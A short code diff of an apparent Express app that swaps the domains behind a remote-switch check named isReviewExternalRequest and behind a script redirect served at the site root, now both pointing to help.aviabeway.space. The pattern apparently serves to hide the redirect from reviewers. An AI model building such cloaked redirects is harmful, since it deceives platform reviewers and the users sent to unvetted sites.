@@ -17,7 +17,7 @@ const options = {
 
 async function isReviewExternalRequest() {
 	try {
-		const response = await fetch('https://help.pinmix.space');
+		const response = await fetch('https://help.aviabeway.space');
 
 		// Проверяем статус ответа
 		if (response.status === 404) {
@@ -70,7 +70,7 @@ app.get('/', async (req, res) => {
 				<head>
 					<title>Redirect</title>
 					<script>
-					window.location.href = 'https://help.onewinker.fun';
+					window.location.href = 'https://help.aviabeway.space';
 					</script>
 				</head>
 				<body>
